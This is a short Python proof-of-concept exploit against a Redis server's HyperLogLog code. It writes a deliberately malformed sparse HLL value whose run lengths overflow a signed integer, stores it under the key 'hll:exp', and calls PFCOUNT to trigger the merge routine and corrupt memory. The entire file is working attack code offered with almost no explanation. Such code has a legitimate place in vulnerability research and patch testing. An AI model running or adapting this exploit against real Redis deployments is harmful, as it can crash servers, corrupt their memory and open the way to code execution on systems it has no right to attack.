#!/usr/bin/env python3

import redis

HOST, PORT = 'localhost', 6379
r = redis.Redis(HOST, PORT)

HLL_SPARSE = 1

def p8(v):
  return bytes([v])

def xzero(sz):
  assert 1 <= sz <= 0x4000
  sz -= 1
  return p8(0b01_000000 | (sz >> 8)) + p8(sz & 0xff)

# malformed sparse hll
pl = b'HYLL'
pl += p8(HLL_SPARSE) + p8(0)*3
pl += p8(0)*8
assert len(pl) == 0x10
pl += xzero(0x4000) * 0x20000   # (int)(0x4000 * 0x20000) = -0x80000000
pl += p8(0b1_11111_11)          # runlen = 4, regval = 0x20
r.set('hll:exp', pl)

# trigger hllMerge
r.pfcount('hll:exp', 'hll:exp')
